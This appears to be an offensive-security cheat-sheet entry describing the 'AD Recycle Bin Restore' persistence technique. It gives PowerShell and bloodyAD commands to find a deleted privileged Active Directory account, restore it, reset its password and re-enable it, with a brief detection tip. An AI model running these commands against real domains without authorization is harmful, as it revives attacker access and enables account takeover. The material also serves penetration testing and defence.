---
technique: AD Recycle Bin Restore
category: persistence
targets: Deleted AD Objects
protocols: LDAP
remote_capable: true
tags: ad recycle-bin restore tombstone persistence ldap
---

# AD Recycle Bin Restore

AD Recycle Bin can restore deleted objects with their original SID and group membership. If a privileged account was deleted but remains recoverable, restoring and resetting it can revive access paths.

## Prerequisites

| Requirement | Detail |
|-------------|--------|
| Recycle Bin | The AD Recycle Bin optional feature must be enabled |
| Rights | Restore requires sufficient rights over deleted objects and the original container |
| Account state | Restored user accounts usually need a password reset and enable action |

## Windows

### Check Recycle Bin feature

#powershell #rsat #recycle-bin

Check whether the AD Recycle Bin optional feature is enabled.

```powershell title:"Check AD Recycle Bin feature"
Get-ADOptionalFeature 'Recycle Bin Feature'
```
<!-- cheat -->

### List deleted users

#powershell #rsat #deleted-objects

List deleted user objects from the Deleted Objects container.

```powershell title:"List deleted user objects"
Get-ADObject -SearchBase "CN=Deleted Objects,$base_dn" -LDAPFilter "(objectClass=user)" -IncludeDeletedObjects -Properties objectSid,samAccountName,lastKnownParent,whenChanged
```
<!-- cheat
var base_dn
-->

### Find deleted user

#powershell #rsat #deleted-objects

Find a deleted object by its previous samAccountName.

```powershell title:"Find deleted user by samAccountName"
Get-ADObject -SearchBase "CN=Deleted Objects,$base_dn" -IncludeDeletedObjects -LDAPFilter "(samAccountName=$target_user)"
```
<!-- cheat
var base_dn
var target_user
-->

### Restore deleted object

#powershell #rsat #restore

Restore the deleted object by GUID.

```powershell title:"Restore deleted object by GUID"
Restore-ADObject -Identity $object_guid
```
<!-- cheat
var object_guid
-->

### Reset restored password

#powershell #rsat #password

Set a new password on the restored account.

```powershell title:"Reset restored account password"
Set-ADAccountPassword -Identity $target_user -Reset -NewPassword (ConvertTo-SecureString '$target_pass' -AsPlainText -Force)
```
<!-- cheat
var target_user
var target_pass
-->

### Enable restored account

#powershell #rsat #account

Enable the restored account after resetting the password.

```powershell title:"Enable restored account"
Enable-ADAccount -Identity $target_user
```
<!-- cheat
var target_user
-->

## Linux

### bloodyAD: restore deleted object

#bloodyad #restore #deleted-objects

Restore a deleted object from Linux through LDAP.

```sh title:"Restore deleted object with bloodyAD"
bloodyAD --host $rhost_name -d $domain -u $user $auth_flags set restore $target_user
```
<!-- cheat
import domain_ip
import users
import bloody_auth
var rhost_name
var target_user
-->

## Detection

Monitor deleted object restores, password resets on restored accounts, and re-enabled privileged accounts.
